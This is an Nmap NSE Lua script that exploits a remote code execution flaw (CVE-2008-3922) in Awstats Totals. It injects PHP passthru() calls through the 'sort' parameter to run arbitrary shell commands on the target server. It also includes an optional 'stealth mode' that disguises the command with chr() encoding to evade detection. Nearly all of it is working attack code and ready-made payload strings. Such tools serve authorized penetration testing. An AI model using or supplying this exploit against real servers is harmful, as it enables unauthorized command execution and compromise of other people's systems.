description = [[
  http-awstatstotals-exec exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it. [CVE: 2008-3922] 

  Stealth mode encodes the command string using PHP's chr() function. Ex.
  * Normal mode:
<code>?sort={%24{passthru%28$_GET[CMD]%29}}{%24{exit%28%29}}&CMD=uname%20-a</code>  
  * Stealth mode:
<code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>

Common paths for Awstats Total:
* /awstats/index.php
* /awstatstotals/index.php
* /awstats/awstatstotals.php
]]

---
-- @usage
-- nmap --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.stealth, http-awstatstotals-exec.uri=/awstats/index.php' -p80  <host/ip>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- |_http-awstatstotals-exec.nse: Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux
--
-- @args http-awstatstotals-exec.uri Awstats Totals URI including path
-- @args http-awstatstotals-exec.cmd Command to execute
-- @args http-awstatstotals-exec.stealth Stealth mode encodes command payload using PHP's chr()
-- @args http-awstatstotals-exec.outfile Output file
---

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

require "shortport"
require "http"
require "url"

portrule = shortport.http

--default values
local DEFAULT_CMD = "whoami"
local DEFAULT_URI = "index.php"
local PAYLOAD = "?sort={%24{passthru%28$_GET[CMD]%29}}{%24{exit%28%29}}&CMD="

---
--Writes string to file
--@param filename Filename to write
--@param content Content string
--@return boolean status
--@return string error
--Taken from: hostmap.nse
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

---
--Checks if Awstats Totals installation seems to be there
--@param host Host table
--@param port Port table
--@param path Path pointing to AWStats Totals
--@return true if awstats totals is found
local function check_installation(host, port, path)
  local check_req = http.get(host, port, path)
  if not(http.response_contains(check_req, "AWStats")) then
    return false
  end
  return true
end

---
--MAIN
---
action = function(host, port)
  local output = {}
  local uri = stdnse.get_script_args("http-awstatstotals-exec.uri") or DEFAULT_URI
  local cmd = stdnse.get_script_args("http-awstatstotals-exec.cmd") or DEFAULT_CMD
  local out = stdnse.get_script_args("http-awstatstotals-exec.outfile") 
  local stealth = stdnse.get_script_args("http-awstatstotals-exec.stealth")
  local attack_uri = uri..PAYLOAD..url.escape(cmd)

  --check for awstats signature
  local awstats_check = check_installation(host, port, uri)
  if not(awstats_check) then
    stdnse.print_debug(1, "%s:This does not look like Awstats Totals. Quitting.", SCRIPT_NAME)
    return
  end
  output[#output+1] = "Command:"..cmd
  --stealth mode is on, encode payload...
  if stealth then
    local encoded_payload = ""
    cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
    if string.sub(encoded_payload, #encoded_payload) == "." then
      encoded_payload = string.sub(encoded_payload, 1, #encoded_payload-1)
    end
    local stealth_payload = "?sort={%24{passthru%28"..encoded_payload.."%29}}{%24{exit%28%29}}"
    attack_uri = uri .. stealth_payload
  end

  --set payload and send request
  local req = http.get(host, port, attack_uri)
  if req.status and req.status == 200 then
    output[#output+1] = req.body

    --if out set, save output to file
    if out then
      local status, err = write_file(out,  req.body)
      if status then
        output[#output+1] = string.format("Output saved to %s\n", out)
      else
        output[#output+1] = string.format("Error saving output to %s: %s\n", out, err)
      end
    end

  else
    if nmap.verbosity() >= 2 then
      output[#output+1] = "[Error] Request did not return 200. Make sure your URI value is correct."
    end
  end

  --output
  if #output>0 then
    return stdnse.strjoin("\n", output)
  end
end
